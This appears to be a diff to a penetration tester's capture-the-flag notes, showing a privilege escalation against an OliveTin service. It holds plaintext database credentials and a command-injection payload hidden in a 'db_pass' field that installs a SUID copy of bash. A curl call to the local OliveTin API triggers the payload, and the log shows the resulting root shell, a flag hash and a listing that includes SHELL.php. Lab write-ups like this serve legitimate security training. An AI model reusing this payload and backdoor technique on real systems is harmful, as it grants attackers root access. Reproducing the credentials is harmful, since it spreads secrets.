@@ -170,3 +170,45 @@ $db_password = 'Fri3nds@9099';
 mysql -u brollin -p'Fri3nds@9099' 
 
 harris:bestfriends
+
+cat > /tmp/backdoor.json <<'EOF'
+{
+  "actionId": "backup_database",
+  "actionTitle": "Backup Database",
+  "bindingId": "backup_database",
+  "arguments": [
+    {"name": "db_user", "value": "backup_svc"},
+    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
+    {"name": "db_name", "value": "production"}
+  ]
+}
+EOF
+ls
+anagrafiche
+backups
+dashboard
+fatture
+importFE_ZIP
+impostazioni
+provenienze
+receiptFE
+relazioni_anagrafiche
+settori_merceologici
+SHELL.php
+stato_servizi
+temp
+utenti
+zone
+curl -s -X POST \
+  -H 'Content-Type: application/json' \
+  -H 'Connect-Protocol-Version: 1' \
+  --data @/tmp/backdoor.json \
+  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
+{"executionTrackingId":"6c245f83-2bb4-4b27-800a-4e742e209375"}
+/tmp/.bs -p
+whomai
+/tmp/.bs: line 1: whomai: command not found
+whoami
+root
+cat /root/root.txt
+022368bdfb846878378f4944fdcda66b
